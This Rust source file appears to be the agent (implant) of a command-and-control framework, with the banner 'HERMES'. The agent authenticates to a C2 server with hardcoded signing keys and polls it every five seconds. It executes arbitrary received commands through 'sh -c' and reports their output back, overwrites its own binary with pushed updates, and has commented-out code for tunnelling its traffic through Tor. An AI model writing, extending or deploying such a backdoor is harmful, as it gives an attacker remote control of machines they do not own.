use std::{fs, process::Command, thread, time};

// use arti_client::{TorClient, TorClientConfig};
// use arti_hyper::ArtiHttpConnector;
use base64::{prelude::BASE64_STANDARD, Engine as _};
use common::{api, crypto};
use log::{error, info};
// use futures::{Stream, StreamExt};
// use hyper::Body;
// use tls_api::{TlsConnector as TlsConnectorTrait, TlsConnectorBuilder};
// use tls_api_openssl::TlsConnector;

// #[cfg(debug_assertions)]
// struct MissionStream;

// #[cfg(not(debug_assertions))]
// struct MissionStream {
//     tor_client: TorClient<PreferredRuntime>,
// }

// #[cfg(not(debug_assertions))]
// impl MissionStream {
//     fn new() -> Self {
//         MissionStream {
//             tor_client: TorClient::create_bootstrapped(TorClientConfig::default()),
//         }
//     }
// }

// #[cfg(not(debug_assertions))]
// impl Stream for MissionStream {
//     type Item = Vec<Mission>;

//     fn poll_next(
//         self: std::pin::Pin<&mut Self>,
//         cx: &mut std::task::Context<'_>,
//     ) -> std::task::Poll<Option<Self::Item>> {
//         let http = hyper::Client::new();
//         let mut resp = http.get("localhost:3000".try_into()?).await?;
//         let mut resp = tokio::join!(http.get("localhost:3000".try_into()?));

//         println!("Status: {}", resp.status());
//         let body = hyper::body::to_bytes(resp.body_mut()).await?;
//         println!("Body: {}", std::str::from_utf8(&body)?);
//         cx.waker().wake_by_ref();
//         std::task::Poll::Pending
//     }
// }

// #[tokio::main]
// async fn main() -> anyhow::Result<()> {
//     println!("Starting Arti...");
//     let tor_client = TorClient::create_bootstrapped(TorClientConfig::default()).await?;

//     let tls_connector = TlsConnector::builder()?.build()?;

//     let tor_connector = ArtiHttpConnector::new(tor_client, tls_connector);
//     let http = hyper::Client::builder().build::<_, Body>(tor_connector);

//     println!("Requesting http://icanhazip.com via Tor...");
//     let mut resp = http.get("http://icanhazip.com".try_into()?).await?;
//     println!("Status: {}", resp.status());
//     let body = hyper::body::to_bytes(resp.body_mut()).await?;
//     println!("Body: {}", std::str::from_utf8(&body)?);

//     println!("Requesting http://icanhazip.com without Tor...");
//     let http = hyper::Client::new();
//     let mut resp = http.get("http://icanhazip.com".try_into()?).await?;
//     println!("Status: {}", resp.status());
//     let body = hyper::body::to_bytes(resp.body_mut()).await?;
//     println!("Body: {}", std::str::from_utf8(&body)?);

//     Ok(())
// }

mod client;
mod error;

type AgentResult<T> = Result<T, error::AgentError>;

const IDENTITY: &str = "1nlpuul3mNmk9oJ27Usp5Ekfm+MM1CMYBX8FiLTwqd8=";
const C2_VERIFYING_KEY: &str = "IX+xwv+SMQr4QZB8ba1n/fx3W3t5KvHQoCtBJ5HJZuk=";

fn main() -> AgentResult<()> {
    env_logger::init();
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░░▒▓██████████████▓▒░░▒▓████████▓▒░░▒▓███████▓▒░");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░       ");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░       ");
    info!("░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░  ░▒▓██████▓▒░ ");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░ ");

    let mut signing_key = crypto::get_signing_key_from(
        BASE64_STANDARD
            .decode(IDENTITY)
            .unwrap()
            .as_slice()
            .try_into()
            .unwrap(),
    );
    let c2_verifying_key = crypto::VerifyingKey::from_bytes(
        BASE64_STANDARD
            .decode(C2_VERIFYING_KEY)
            .unwrap()
            .as_slice()
            .try_into()
            .unwrap(),
    )
    .unwrap();

    loop {
        match client::get_mission(&mut signing_key, &c2_verifying_key) {
            Ok(mission) => {
                if let Some(mission) = mission {
                    match &mission.task {
                        api::Task::Update(data) => {
                            let agent_bin = std::env::args().next().expect("arguments provided");
                            info!("Updating agent '{agent_bin}'");
                            fs::write(agent_bin, data)?;
                            if unsafe { libc::fork() } == 0 {
                                client::report_mission(&mut signing_key, mission, "OK")?;
                            } else {
                                break;
                            }
                        }
                        api::Task::Execute(command) => {
                            info!("Executing command: {command}");
                            let output = Command::new("sh").arg("-c").arg(command).output()?;
                            client::report_mission(
                                &mut signing_key,
                                mission,
                                &String::from_utf8(output.stdout).unwrap(),
                            )?;
                        }
                        api::Task::Stop => {
                            client::report_mission(&mut signing_key, mission, "OK")?;
                            break;
                        }
                    }
                }
            }
            Err(e) => error!("Error: {e}"),
        }
        thread::sleep(time::Duration::from_secs(5));
    }
    info!("Stopping agent");
    Ok(())
}
